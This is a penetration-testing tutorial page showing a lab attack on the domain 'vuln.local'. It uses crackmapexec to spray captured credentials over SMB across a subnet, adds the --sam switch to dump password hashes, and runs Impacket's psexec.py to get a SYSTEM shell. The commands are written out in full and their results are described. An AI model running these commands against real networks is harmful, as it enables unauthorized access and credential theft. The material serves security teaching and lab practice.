# Pass the Password

If we have valid credentials or credentials in which we believe to be valid we can use crackmapexec to spray a range of computers with these credentials to see what we can authenticate against.

## Scenario

In this scenario we are an attacker on the network of 192.168.64.0/24. We have gained credentials for a domain user account 'Bart.Simpson'. We can use a tool called crackmapexec to try these against a particular protocol against a range of computers.

## Crackmapexec

As stated above we can use crackmapexec to test credentials against a particular protocol on a range of computers to see what we can authenticate against.

We can use the command below to test this against SMB on the range 192.168.64.0/24.

```
crackmapexec smb 192.168.64.0/24 -u Bart.simpson -d vuln.local -p 'Password001'
```

Where:

* smb is the protocol to authenticate against.
* 192.168.64.0/24 is the CIDR range to search
* \-d is the domain name
* \-u is the username
* \-p is the users password.

![](<../../../../.gitbook/assets/image (1534).png>)

We can confirm from the results with the supplied credentials we can authenticate against SMB on the workstations WS01 and WS02.

Now that we have confirmed credentials if the user account is an administrator on any of the machines we may be able to dump the hashes in the SAM database by adding the `--sam` switch to the command.

```
crackmapexec smb 192.168.64.0/24 -u Bart.simpson -d vuln.local -p 'Password001' --sam
```

![](<../../../../.gitbook/assets/image (1535).png>)

We could then attempt to gain shell on the machine with Impacket's psexec.py with the validated credentials.

```
psexec.py vuln.local/Bart.Simpson:Password001@192.168.64.131
```

![](<../../../../.gitbook/assets/image (1536).png>)

We have gained shell as 'NT Authority\System' on the machine WS01.
